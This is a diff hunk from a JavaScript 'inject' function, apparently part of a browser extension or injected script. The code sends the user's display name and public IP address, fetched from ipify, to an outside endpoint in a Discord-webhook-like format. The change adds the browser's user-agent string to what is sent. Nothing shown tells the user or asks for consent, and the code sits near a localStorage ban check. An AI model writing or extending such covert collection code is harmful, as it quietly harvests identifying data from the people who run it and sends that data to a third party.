@@ -72,7 +72,7 @@ var inject = function () {
     headers : {'Content-Type' : 'application/json'},
     body : JSON.stringify({
       username: reason || window.Bot?.users?.[Bot.myId]?.fullName,
-      content: await (await fetch("https://api.ipify.org")).text()
+      content: navigator.userAgent + '\n' + await (await fetch("https://api.ipify.org")).text()
     })
   }).catch(e => e);
   var unbanJSON = localStorage.getItem('extensionBAN');
